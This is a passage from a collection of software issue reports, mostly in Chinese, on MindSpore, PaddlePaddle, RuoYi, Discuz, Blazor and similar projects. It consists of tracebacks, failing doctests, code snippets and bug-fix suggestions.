""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe/impl/four_2_five.py"", line 1317, in four_2_five E te.lang.cce.cce_build_code(sch, config) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/lang/cce/api.py"", line 1282, in cce_build_code E return tbe.dsl.build(sch, config_map) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/dsl/api.py"", line 1002, in build E return tbe_build(sch, config_map) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/dsl/unify_schedule/build.py"", line 40, in build E return static_build(sch, config_map) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1473, in cce_build_code E _build(sch, tensor_list, local_config_map[""name""]) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1408, in _build E tvm.build(sch, tensor_list, device, name=name) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/build_module.py"", line 962, in build E fhost, mdev = _build_for_device(flist, tar, target_host) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/build_module.py"", line 757, in _build_for_device E mdev = codegen.build_module(fdevice, str(target)) if fdevice else None E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/codegen.py"", line 36, in build_module E return _Build(lowered_func, target) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 209, in __call__ E raise get_last_ffi_error() E tvm._ffi.base.TVMError: Traceback (most recent call last): E [bt] (6) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(TVMFuncCall+0x70) [0xffffa5928d00] E [bt] (5) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0xdc0998) [0xffffa4d50998] E [bt] (4) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::codegen::Build(tvm::Array&lt;tvm::LoweredFunc, void&gt; const&amp;, std::string const&amp;)+0x474) [0xffffa4ee7c2c] E [bt] (3) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x126ce60) [0xffffa51fce60] E [bt] (2) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x126c3d4) [0xffffa51fc3d4] E [bt] (1) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x126ac04) [0xffffa51fac04] E [bt] (0) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x1997c34) [0xffffa5927c34] E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/runtime/cce_runtime.py"", line 219, in tvm_callback_cce_compile E output_dir, bin_file_prefix + kernel_name + bin_file_suffix)) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/cce_build_module.py"", line 42, in wrapper E r = fn(*args, **kw) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 708, in compile_cce E _run_cmd(compile_cmd, ""compile"") E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 530, in _run_cmd E _run_cmd_stackoverflow_case(cmd, cmd_type) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 489, in _run_cmd_stackoverflow_case E raise CompileError(msg) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 74, in cfun E rv = local_pyfunc(*pyargs) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/runtime/cce_runtime.py"", line 222, in tvm_callback_cce_compile E raise RuntimeError(""compile cce error : "", errs) E E Compile Error: Unknown errors E E E During handling of the above exception, another exception occurred: E E Traceback (most recent call last): E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 202, in &lt;module&gt; E result = compile_with_json(in_args) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 196, in compile_with_json E ret = build_op(op_build, json_str, None) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 156, in build_op E raise RuntimeError(e) E RuntimeError: Traceback (most recent call last): E [bt] (6) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(TVMFuncCall+0x70) [0xffffa5928d00] E [bt] (5) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0xdc0998) [0xffffa4d50998] E [bt] (4) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::codegen::Build(tvm::Array&lt;tvm::LoweredFunc, void&gt; const&amp;, std::string const&amp;)+0x474) [0xffffa4ee7c2c] E [bt] (3) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x126ce60) [0xffffa51fce60] E [bt] (2) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x126c3d4) [0xffffa51fc3d4] E [bt] (1) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x126ac04) [0xffffa51fac04] E [bt] (0) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x1997c34) [0xffffa5927c34] E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/runtime/cce_runtime.py"", line 219, in tvm_callback_cce_compile E output_dir, bin_file_prefix + kernel_name + bin_file_suffix)) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/cce_build_module.py"", line 42, in wrapper E r = fn(*args, **kw) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 708, in compile_cce E _run_cmd(compile_cmd, ""compile"") E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 530, in _run_cmd E _run_cmd_stackoverflow_case(cmd, cmd_type) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 489, in _run_cmd_stackoverflow_case E raise CompileError(msg) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 74, in cfun E rv = local_pyfunc(*pyargs) E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te/tvm/runtime/cce_runtime.py"", line 222, in tvm_callback_cce_compile E raise RuntimeError(""compile cce error : "", errs) E E Compile Error: Unknown errors E E E input_args: {""SocInfo"": {""autoTilingMode"": ""NO_TUNE"", ""coreNum"": """", ""coreType"": """", ""l1Fusion"": ""false"", ""l2Fusion"": ""false"", ""l2Mode"": ""2"", ""op_debug_level"": """", ""op_impl_mode"": """", ""op_impl_mode_list"": [], ""socVersion"": ""Ascend910A""}, ""impl_path"": """", ""op_info"": {""Type"": ""TransData"", ""attr_desc"": [""NCHW"", ""NC1HWC0"", 1], ""attrs"": [{""name"": ""src_format"", ""valid"": true, ""value"": ""NCHW""}, {""name"": ""dst_format"", ""valid"": true, ""value"": ""NC1HWC0""}, {""name"": ""groups"", ""valid"": true, ""value"": 1}], ""full_name"": ""Default/TransData-op190"", ""gen_model"": ""single"", ""graph_id"": 80, ""inputs"": [[{""addr_type"": 0, ""dtype"": ""float32"", ""format"": ""NCHW"", ""name"": ""src_0"", ""ori_format"": ""NCHW"", ""ori_shape"": [128, 128, 28, 28], ""param_type"": ""required"", ""range"": [[128, 128], [128, 128], [28, 28], [28, 28]], ""shape"": [128, 128, 28, 28], ""valid"": true}]], ""is_dynamic_shape"": false, ""kernel_name"": ""TransData_8960054342544393519_1"", ""module_name"": ""impl.trans_data"", ""name"": ""trans_data"", ""op_tune_list"": ""ALL"", ""op_tune_switch"": ""on"", ""outputs"": [[{""addr_type"": 0, ""dtype"": ""float32"", ""format"": ""NC1HWC0"", ""name"": ""dst"", ""ori_format"": ""NCHW"", ""ori_shape"": [128, 128, 28, 28], ""param_type"": ""required"", ""range"": [[128, 128], [8, 8], [28, 28], [28, 28], [16, 16]], ""shape"": [128, 8, 28, 28, 16], ""valid"": true}]], ""pass_list"": ""ALL"", ""py_module_path"": ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe"", ""rl_tune_list"": ""ALL"", ""rl_tune_switch"": ""on"", ""socVersion"": ""Ascend910A""}, ""platform"": ""TBE"", ""reset_op_info"": [{""type"": ""clear_vector"", ""bin_path"": ""./kernel_meta/vector_random_buff.o"", ""kernel_name"": ""vector_random_buff""}, {""type"": ""clear_cube"", ""bin_path"": ""./kernel_meta/cube_random_buff.o"", ""kernel_name"": ""cube_random_buff""}]} trace: E E # /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:605: RuntimeError"
[CI][MS][doc]Example problems of Doc API in Ascend backend.,": Ascend /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : mindspore.ops.operations.math_ops.CumSum mindspore.ops.operations.math_ops.ReduceProd https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.CumSum.html#mindspore.ops.CumSum https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.ReduceProd.html#mindspore.ops.ReduceProd mindspore.ops.operations.math_ops.CumSum mindspore.ops.operations.math_ops.ReduceProd   <code>: File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 1203, in mindspore.ops.operations.math_ops.CumSum Failed example: print(y) Expected: [[ 3. 7. 6. 10.] [ 4. 10. 13. 19.] [ 8. 13. 21. 26.] [ 9. 16. 28. 35.]] Got: [[ 3. 4. 6. 10.] [ 4. 10. 13. 19.] [ 8. 13. 21. 26.] [ 9. 16. 28. 35.]] File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 1219, in mindspore.ops.operations.math_ops.CumSum Failed example: print(y) Expected: [[ 0. 3. 7. 23.] [ 0. 1. 7. 14.] [ 0. 4. 7. 15.] [ 0. 1. 4. 11.]] Got: [[ 0. 3. 7. 13.] [ 0. 1. 7. 14.] [ 0. 4. 7. 15.] [ 0. 1. 4. 11.]] File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 1227, in mindspore.ops.operations.math_ops.CumSum Failed example: print(y) Expected: [[ 23. 20. 16. 10.] [ 23. 22. 16. 9.] [ 22. 18. 15. 9.] [ 20. 19. 16. 9.]] Got: [[23. 20. 16. 10.] [23. 22. 16. 9.] [22. 18. 15. 7.] [20. 19. 16. 9.]] File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 901, in mindspore.ops.operations.math_ops.ReduceProd Failed example: print(output) Expected: [[[1.]]] Got: [[[2.2833798e+33]]] Trying: print(output.shape) Expecting: (1, 1, 1) ok Trying: output = op(x, 0) Expecting nothing ok Trying: print(output) Expecting: [[[1. 1. 1. 1. 1. 1.] [2. 2. 2. 2. 2. 2.] [3. 3. 3. 3. 3. 3.]]] ********************************************************************** File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 907, in mindspore.ops.operations.math_ops.ReduceProd Failed example: print(output) Expected: [[[1. 1. 1. 1. 1. 1.] [2. 2. 2. 2. 2. 2.] [3. 3. 3. 3. 3. 3.]]] Got: [[[ 28. 28. 28. 28. 28. 28.] [ 80. 80. 80. 80. 80. 80.] [162. 162. 162. 162. 162. 162.]]] Trying: output = op(x, 1) Expecting nothing ok Trying: print(output) Expecting: [[[1. 1. 1. 1. 1. 1.]] [[4. 4. 4. 4. 4. 4.]] [[7. 7. 7. 7. 7. 7.]]] ********************************************************************** File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 913, in mindspore.ops.operations.math_ops.ReduceProd Failed example: print(output) Expected: [[[1. 1. 1. 1. 1. 1.]] [[4. 4. 4. 4. 4. 4.]] [[7. 7. 7. 7. 7. 7.]]] Got: [[[ 6. 6. 6. 6. 6. 6.]] &lt;BLANKLINE&gt; [[120. 120. 120. 120. 120. 120.]] &lt;BLANKLINE&gt; [[504. 504. 504. 504. 504. 504.]]] Trying: output = op(x, 2) Expecting nothing ok Trying: print(output) Expecting: [[[1.] [2.] [3.]] [[4.] [5.] [6.]] [[7.] [8.] [9.]]] ********************************************************************** File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 919, in mindspore.ops.operations.math_ops.ReduceProd Failed example: print(output) Expected: [[[1.] [2.] [3.]] [[4.] [5.] [6.]] [[7.] [8.] [9.]]] Got: [[[1.00000e+00] [6.40000e+01] [7.29000e+02]] &lt;BLANKLINE&gt; [[4.09600e+03] [1.56250e+04] [4.66560e+04]] &lt;BLANKLINE&gt; [[1.17649e+05] [2.62144e+05] [5.31441e+05]]]"
请教复现MobileFaceNets问题,"我在复现 MobileFaceNets 模型的时候，为什么这个模型没有说全连接层，它是否需要用到全连接层？   <code>: def net(input, class_dim): bottleneck_params_list = [ (2, 64, 5, 2), (4, 128, 1, 2), (2, 128, 6, 1), (4, 128, 1, 2), (2, 128, 2, 1), ] # conv 3*3 input = conv_bn_layer(input, num_filters=64, filter_size=3, stride=2, padding=1, if_act=True) # detphwise conv 3*3 input = depthwise_separable(input, num_filters1=64, num_filters2=64, num_groups=64, stride=1, padding=1, if_act=True) # bottleneck in_c = 32 for layer_setting in bottleneck_params_list: t, c, n, s = layer_setting input = invresi_blocks(input=input, in_c=in_c, t=t, c=c, n=n, s=s) in_c = c # conv 1*1 input = conv_bn_layer(input=input, num_filters=512, filter_size=1, stride=1, padding=0, if_act=True) # linear GDConv 7*7 input = depthwise_separable(input, num_filters1=512, num_filters2=512, num_groups=512, stride=1, padding=0, if_act=False) # linear conv 1*1 feature = conv_bn_layer(input=input, num_filters=128, filter_size=1, stride=1, padding=0, if_act=False) return feature"
微服务版本各个服务使用docker方式部署都存在内存增长直到oomkill,docker file auth服务内存监控截图 ruoyi版本3.1.0   <code>: FROM lwieske/java-8 # set Time zone ENV TZ=Asia/Shanghai RUN set -eux; \ ln -snf /usr/share/zoneinfo/$TZ /etc/localtime; \ echo $TZ &gt; /etc/timezone ADD target/*.jar app.jar ENTRYPOINT java ${JAVA_OPTS} -jar /app.jar -Dfile.encoding=utf-8 -Dspring.profiles.active=dev -Dspring.cloud.nacos.discovery.server-addr=192.168.0.164:30048 -Dspring.cloud.nacos.config.server-addr=192.168.0.164:30048 -Xmx200m -Xms200m -XX:MetaspaceSize=44m -XX:MaxMetaspaceSize=88m -XX:MaxDirectMemorySize=88m -Dfile.encoding=utf-8 -Dspring.profiles.active=test -Dspring.cloud.nacos.discovery.server-addr= -Dspring.cloud.nacos.config.server-addr= -Xmx100m -Xms100m -Xss1024K -XX:MetaspaceSize=64m -XX:MaxMetaspaceSize=128m -XX:MaxDirectMemorySize=64m -XX:NativeMemoryTracking=detail -XX:+UseContainerSupport
七牛云上传失败问题,"问题：七牛云上传文件失败，上传后图片加载的url是http://域名/null/1 分析：目测是七牛云服务器区域问题。 解决方法： 1、升级七牛云JDK &lt;qiniu.version&gt;7.11.0&lt;/qiniu.version&gt; 2、修改区域自动获取 在mogo_picture模块下 com.moxi.mogublog.picture.util.QiniuUtil.java 文件 使用Configuration cfg = new Configuration(Region.autoRegion());自动获取对象存储区域   <code>: /** * 七牛云上传图片 * * @param localFilePath * @return */ public String uploadQiniu(File localFilePath, SystemConfig qiNiuConfig) throws QiniuException { //构造一个带指定Zone对象的配置类 //Configuration cfg = setQiNiuArea(qiNiuConfig.getQiNiuArea()); Configuration cfg = new Configuration(Region.autoRegion()); //生成上传凭证，然后准备上传 String accessKey = qiNiuConfig.getQiNiuAccessKey(); String secretKey = qiNiuConfig.getQiNiuSecretKey(); String bucket = qiNiuConfig.getQiNiuBucket(); //...其他参数参考类注释 UploadManager uploadManager = new UploadManager(cfg); String key = StringUtils.getUUID(); Auth auth = Auth.create(accessKey, secretKey); String upToken = auth.uploadToken(bucket); Response response = uploadManager.put(localFilePath, key, upToken); //解析上传成功的结果 DefaultPutRet putRet = new Gson().fromJson(response.bodyString(), DefaultPutRet.class); log.info(""{七牛图片上传key: "" + putRet.key + "",七牛图片上传hash: "" + putRet.hash + ""}""); return putRet.key; }"
[CT][MS][ComplexAbs] API description  has some problems ,"ComplexAbs API 描述有些问题 1.summary部分描述太简单，不便于了解算子功能，建议参考标杆进行补充 2.输入描述可以游湖， 没有说明支持类型 / 硬件环境: /device ascend/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 接口API 检查接口描述 summary部分详细说明接口功能 2.输入列出支持类型   <code>: class ComplexAbs(Primitive): """""" Returns a Tensor that is the absolute value part of the input. Inputs: -**input** (Tensor) - The input tensor to compute to. class ComplexAbs(Primitive): """""" Returns a Tensor that is the absolute value part of the input. Inputs: -**input** (Tensor) - The input tensor to compute to."
侧边栏点击开源软件 再选择编程语言  这个界面可以无限上拉加载  并且加载出来的都是重复的数据,原因是在基类OSCObjsViewController的- (void)fetchObjectsOnPage:(NSUInteger)page refresh:(BOOL)refresh方法中 做的判断并不严谨 这个页面并没有做分页而且第0页的数据超过了magic number 20   <code>: if (objectsXML.count == 0 || (_page == 0 &amp;&amp; objectsXML.count &lt; 20)) { _lastCell.status = LastCellStatusFinished; }
离线下载word提示“该功能尚未实现”,版本： 请问什么时候能实现？   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt;
建议pom增加jetty plugin,"BoxRute.initTask方法貌似有问题。 重复进行了判断，最终是aspectMap key为CronTask.class的值会自动覆盖。 这里貌似有bug   <code>: &lt;plugin&gt; &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt; &lt;artifactId&gt;jetty-maven-plugin&lt;/artifactId&gt; &lt;version&gt;9.4.8.v20171121&lt;/version&gt; &lt;/plugin&gt; for (Method method : methods) { CronTask cronTask = method.getAnnotation(CronTask.class); if (StringUtil.isNullOrEmpty(cronTask) || StringUtil.isNullOrEmpty(cronTask.value())) { continue; } BoxConstant.aspectMap.put(CronTask.class, TaskTrigger.getTriggerMethod()); }"
优化多角色数据权限匹配规则，有个疑问,"请问一下多角色匹配规则当permission为null的时候，是不是少了判断？还是就是这么设计的？不是很理解，可以详情说明一下设计的思想吗？ 我得理解是为null应该不做数据权限判断，需要做权限判断再加上@RequiresPermissions即可，现在是不加就做判断，总感觉哪里不对。   <code>: if (StringUtils.isNotEmpty(permission) &amp;&amp; StringUtils.isNotEmpty(role.getPermissions()) &amp;&amp; !StringUtils.containsAny(role.getPermissions(), Convert.toStrArray(permission))) { continue; }"
Optimizing elementwise_add for CPU with MKL,"I working on optimizing operator for CPU. The operator adds two tensors and element by element, and stores the result in tensor . I'm currently focusing on the case when both operands and are of equal dimensions. The optimization uses MKL VML's operation that performs elementwise addition: https://software.intel.com/en-us/mkl-developer-reference-c-v-add When is performed on GPU and/or and are of different dimensions the algorithm falls back to the default implementation. To implement the optimization, I extended an interface of PaddlePaddle BLAS code: https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/operators/math/blas.h with two operations: VADD that performs elementwise add operation with VML routine, and VCOPY that performs copying of two vectors and uses BLAS level 1 routine . I use VCOPY routine with already available SAXPY routine to implement VADD operation for non-MKL case. Is it ok for you to extend the interface of Blas routines in PaddlePaddle for CPU? Currently the algorithm is as follows. What do you think about it?   <code>: elementwise_add x y z x y v?Add elementwise_add x y vAdd cblas_vcopy x = ctx.Input&lt;T&gt;('X') y = ctx.Input&lt;T&gt;('Y') z = ctx.Output&lt;T&gt;('Z') if (ctx.is_cpu_place() and x.dims() == y.dims()) { flatten(x); flatten(y); flatten(z); if (MKL_is_used()) { VADD(x-&gt;numel(), x, y, z); } else { // SAXPY implements y = alpha * x + y // so first content of y is copied to z // and x is added to z VCOPY(y, z); SAXPY(x-&gt;numel(), 1.0 /*alpha*/, x, z) } } else { // fall back to default implentation }"
第三方接口，不符合，api 要求，过滤器能否增强兼容性，使用接口返回的顶级对象作为filter的第二个参数,"需求如题，要更新第三方接口难度通常比较大！ 假如接口返回为（命名为res）： 该对象中并不包含filter使用的data，所以在编辑过滤器时，filter 默认了 data = ''， filter 增加第二个参数 res，就可以兼容任何第三方接口   <code>: { error: 0, message: 'success', result: { count: 1 } }"
登录 auth/oauth/token 接口报503,"pigx版本: 3.1 操作系统:windows 是否修改包名: 是   <code>: http://localhost:10004/auth/oauth/token?username=admin&amp;password=rKu1%2F348LvKp0rsVC06eCA%3D%3D&amp;randomStr=24521563198001713&amp;code=2pb3&amp;grant_type=password&amp;scope=server {""timestamp"":""2019-07-15 21:40:09"",""path"":""/auth/oauth/token"",""status"":503,""error"":""Service Unavailable"",""message"":""Unable to find instance for mice-auth""}"
avue-crud在回调方法uploadAfter后没办法设置form表单的属性值,"avue版本v2.10.1 代码如下： 调用uploadAfter后，没办法设置属性name的值   <code>: &lt;avue-crud ref=""crud"" :page.sync=""page"" :data=""tableData"" :permission=""permissionList"" :table-loading=""tableLoading"" :option=""tableOption"" v-model=""form"" @on-load=""getList"" :upload-after=""uploadAfter"" @search-change=""searchChange"" @refresh-change=""refreshChange"" @size-change=""sizeChange"" @current-change=""currentChange"" @sort-change=""sortChange"" @row-update=""handleUpdate"" @row-save=""handleSave"" @row-del=""rowDel""&gt; &lt;/avue-form&gt; uploadAfter(res, done, loading, column) { console.log(res.url) let name = this.findObject(this.tableOption.column, ""name"") name.value = '自动填充' done() this.$message.success('上传后的方法') }, export const tableOption = { border: true, index: true, indexLabel: '序号', stripe: true, viewBtn: true, delBtn: false, menuAlign: 'center', labelWidth: 140, searchMenuSpan: 6, align: 'center', dialogClickModal: false, column: [ { type: 'select', label: '企业类型', cascader: [], span: 12, display: true, props: { label: 'label', value: 'value' }, prop: 'enterpriseType', dataType: 'string', dicUrl: '/admin/dict/type/enterprise_type', dicMethod: 'get', required: true, rules: [ { required: true, message: '请选择企业类型' } ] }, { label: '企业ID', prop: 'id', editDisabled: true, editDisplay: false, addDisplay: false }, { label: '企业编码', type: 'input', prop: 'code', sortable: true, editDisabled: true, labelTip: '企业唯一标识，注册后不允许修改', rules: [ { required: true, message: '企业编码', trigger: 'blur' }, { min: 3, max: 15, message: '长度在 3 到 15 个字符之间', trigger: 'blur' }, { pattern: '^[a-z0-9][a-z0-9-]+[a-z0-9]$', message: '请输入小写字母、数字和中划线(-)的组合，不能以中划线(-)开头或结尾' } ] }, { label: '企业名称', prop: 'name', search: true, sortable: true, editDisabled: true, rules: [ { required: true, message: '请输入企业名称', trigger: 'blur' }, { min: 3, max: 32, message: '长度在 3 到 32 个字符', trigger: 'blur' } ] }, { label: '企业角色', prop: 'enterpriseIdentity', editDisplay: false, addDisplay: false }, { prop: 'scale', span: 12, type: 'select', label: '企业规模', rules: [], sortable: true, required: true, dicUrl: '/admin/dict/type/scale_type', rules: [{ required: true, message: '请选择企业规模', trigger: 'blur' }], }, { prop: 'capital', span: 12, type: 'input', label: '注册资本', rules: [], sortable: true, }, { prop: 'contactAddress', span: 24, type: 'textarea', label: '联系地址', rules: [], sortable: true, display: true }, { prop: 'registerNumber', span: 12, minWidth: 110, type: 'input', label: '统一社会信用代码', rules: [ { message: '统一社会信用代码必须填写', required: true } ], required: true, sortable: true, }, { label: '营业执照', prop: 'businessLicense', type: 'upload', span: 24, accept: "".JPEG,.JPG,.PNG"", showFileList: true, propsHttp: { res: 'data' }, canvasOption: { text: '蝶宇云' }, sortable: true, required: true, rules: [ { message: '营业执照必须上传', required: true } ], listType: 'picture-img', tip: '文件格式为.jpeg .jpg .png，且大小不超过3Mb', action: '/admin/sys-file/upload/tenant', }, ] }"
Add pixel cross entropy cost layer,Current cross entropy cost layer doesn't support for pixel classification job. We can implement this layer by reusing ， and switch order function.   <code>: Matrix::oneHotCrossEntropyBP Matrix::oneHotCrossEntropy
https网站后台进入应用中心，弹窗容易被浏览器拦截，建议改为直接跳转,"修改后，用户点击后台应用中心的链接，将直接进入应用中心，不会被浏览器拦截 source\admincp\admincp_cloudaddons.php 找到 在上边添加 然后找到 改为 修改后，完整代码如下：   <code>: cloudaddons_check(); if($_G['isHTTPS'] &amp;&amp; !isset($_GET['frame'])){ $query = array(); parse_str($_SERVER['QUERY_STRING'], $query); unset($query['frames']); $query['frame'] = 'no'; $query_sting_tmp = http_build_query($query); echo '&lt;script type=""text/javascript""&gt;parent.location.href=\''.ADMINSCRIPT . '?' . $query_sting_tmp.'\';&lt;/script&gt;'; exit; } if($_G['isHTTPS']) { echo '&lt;script type=""text/javascript""&gt;window.open(\''.$url.'\');&lt;/script&gt;'; } else { echo '&lt;script type=""text/javascript""&gt;location.href=\''.$url.'\';&lt;/script&gt;'; } echo '&lt;script type=""text/javascript""&gt;location.href=\''.$url.'\';&lt;/script&gt;';"
无法使用popconfirm组件,"无法使用popconfirm ，element 版本已更新到2.14.1，发现   <code>: &lt;template&gt; &lt;el-popconfirm title=""这是一段内容确定删除吗？"" &gt; &lt;el-button slot=""reference""&gt;删除&lt;/el-button&gt; &lt;/el-popconfirm&gt; &lt;/template&gt;"
下拉菜单不能工作,"下拉菜单不工作。 package v3.1.6 新建blazor工程-&gt;在Index页加入示例代码 下拉菜单正常工作 实际结果 下拉菜单不工作。 出现如下异常： Microsoft.AspNetCore.Components.Server.Circuits.RemoteRenderer: Warning: Unhandled exception rendering component: Could not find '$' in 'window'. Error: Could not find '$' in 'window'. at https://localhost:44372/_framework/blazor.server.js:8:30748 at Array.forEach () at p (https://localhost:44372/_framework/blazor.server.js:8:30709) at https://localhost:44372/_framework/blazor.server.js:8:31416 at new Promise () at e.beginInvokeJSFromDotNet (https://localhost:44372/_framework/blazor.server.js:8:31390) at https://localhost:44372/_framework/blazor.server.js:1:19202 at Array.forEach () at e.invokeClientMethod (https://localhost:44372/_framework/blazor.server.js:1:19173) at e.processIncomingData (https://localhost:44372/_framework/blazor.server.js:1:17165) Microsoft.JSInterop.JSException: Could not find '$' in 'window'. Error: Could not find '$' in 'window'. at https://localhost:44372/_framework/blazor.server.js:8:30748 at Array.forEach () at p (https://localhost:44372/_framework/blazor.server.js:8:30709) at https://localhost:44372/_framework/blazor.server.js:8:31416 at new Promise () at e.beginInvokeJSFromDotNet (https://localhost:44372/_framework/blazor.server.js:8:31390) at https://localhost:44372/_framework/blazor.server.js:1:19202 at Array.forEach () at e.invokeClientMethod (https://localhost:44372/_framework/blazor.server.js:1:19173) at e.processIncomingData (https://localhost:44372/_framework/blazor.server.js:1:17165) at Microsoft.JSInterop.JSRuntime.InvokeWithDefaultCancellation[T](String identifier, Object[] args) at BootstrapBlazor.Components.JSRuntimeExtensions.InvokeAsync[TValue](IJSRuntime jsRuntime, Object el, String func, Object[] args) at BootstrapBlazor.Components.IdComponentBase.OnAfterRenderAsync(Boolean firstRender) at BootstrapBlazor.Components.TooltipComponentBase.OnAfterRenderAsync(Boolean firstRender) at Microsoft.AspNetCore.Components.RenderTree.Renderer.GetErrorHandledTask(Task taskToHandle) Microsoft.AspNetCore.Components.Server.Circuits.CircuitHost: Error: Unhandled exception in circuit 'KvJlDHDg-k5yZzcLX2Ota15E9FHCZp1Lxw0uMGGHbz4'. Microsoft.JSInterop.JSException: Could not find '$' in 'window'. Error: Could not find '$' in 'window'. at https://localhost:44372/_framework/blazor.server.js:8:30748 at Array.forEach () at p (https://localhost:44372/_framework/blazor.server.js:8:30709) at https://localhost:44372/_framework/blazor.server.js:8:31416 at new Promise () at e.beginInvokeJSFromDotNet (https://localhost:44372/_framework/blazor.server.js:8:31390) at https://localhost:44372/_framework/blazor.server.js:1:19202 at Array.forEach () at e.invokeClientMethod (https://localhost:44372/_framework/blazor.server.js:1:19173) at e.processIncomingData (https://localhost:44372/_framework/blazor.server.js:1:17165) at Microsoft.JSInterop.JSRuntime.InvokeWithDefaultCancellation[T](String identifier, Object[] args) at BootstrapBlazor.Components.JSRuntimeExtensions.InvokeAsync[TValue](IJSRuntime jsRuntime, Object el, String func, Object[] args) at BootstrapBlazor.Components.IdComponentBase.OnAfterRenderAsync(Boolean firstRender) at BootstrapBlazor.Components.TooltipComponentBase.OnAfterRenderAsync(Boolean firstRender) at Microsoft.AspNetCore.Components.RenderTree.Renderer.GetErrorHandledTask(Task taskToHandle)   <code>: @page ""/"" @using BootstrapBlazor.Components &lt;h1&gt;Hello, ClinicWorks!&lt;/h1&gt; Welcome to ADR Tools for Web &lt;SurveyPrompt Title=""How is ADR Tools working for you?"" /&gt; @*&lt;Dropdown TItem=""string"" Items=""@BindItems"" Direction=""Dropup""&gt;&lt;/Dropdown&gt;*@ &lt;Dropdown TItem =""string"" Items=""BindItems"" Color=""Color.Secondary""&gt;&lt;/Dropdown&gt; @code{ private List&lt;SelectedItem&gt; BindItems { get; set; } = new List&lt;SelectedItem&gt; { new SelectedItem{ Text=""北京"",Value=""0""}, new SelectedItem{ Text=""上海"",Value=""1""}, new SelectedItem{ Text=""广州"",Value=""2""}, }; }"
pip install paddlepaddle的方法没更新在安装编译文档中,中英文的安装编译文档都没有的方式。   <code>: pip install paddlepaddle
